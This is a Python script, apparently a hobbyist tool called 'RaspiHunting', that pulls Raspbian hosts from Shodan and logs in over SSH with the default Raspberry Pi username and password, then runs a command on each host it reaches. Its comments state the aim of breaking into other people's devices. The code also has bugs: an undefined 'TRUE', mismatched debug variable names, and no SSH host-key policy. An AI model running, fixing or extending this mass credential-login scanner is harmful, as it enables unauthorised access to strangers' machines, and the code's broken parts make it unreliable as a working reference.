#!/usr/bin/env python3
#Searching the net for unsecure raspberrys with default ssh credentials
#RaspiHunting
#Hunting is just the beginning...

import shodan
import paramiko
import os
import socket
import os
# this is 2018 motherfucker!
import threading

DEBUG = TRUE

def te_rajo():
    print('''\t\t\t
   .~~.   .~~.
  '. \ ' ' / .'
   .~ .~~~..~.
  : .~.'~'.~. :
 ~ (   ) (   ) ~
( : '~'.~.'~' : )
 ~ .~ (   ) ~. ~
  (  : '~' :  )
   '~ .~~~. ~'
       '~'
       ''')


def ssh_connect(hostname, port='22', username='pi', password='raspberry'):
    try:
        client = paramiko.SSHClient()
        client.connect(hostname, port=port, username=username, password=password, timeout=3)
        stdin, stdout, stderr = client.exec_command('ls')
        print(stdout.read())
    except paramiko.AuthenticationException:
        print('Authentication failed when connecting to %s' % hostname)
    except:
        print('Could not SSH to %s' % hostname)
    finally:
        client.close()

def main():

    ShodanKeyString = open('shodankey').readline().rstrip('\n')
    ShodanApi = shodan.Shodan(ShodanKeyString)
    te_rajo()
    try:
        results = ShodanApi.search('raspbian')
        pages = int(int(results['total']) / 100)
        print('Results: %s' % results['total'])
        # lets split this load in threads, because this is 2018
        threads = 8 # this is a lot? i dont know
        list_to_scan = []
        for i in results['matches']:
            if debug:
                print('IP: %s' % i['ip_str'])
            # lets fuck some raspberrys!
            # ssh connect
            ssh_connect(i['ip_str'])
        for i in range(2, pages):
            results = ShodanApi.search('raspbian', page=i)
            for i in results['matches']:
                print('IP: %s' % i['ip_str'])
                # lets fuck some raspberrys!
                # ssh connect
                ssh_connect(i['ip_str'])
    except shodan.APIError as e:
        print('Ups... Something has gone wrong: %s' % e)

if __name__== "__main__":
    main()
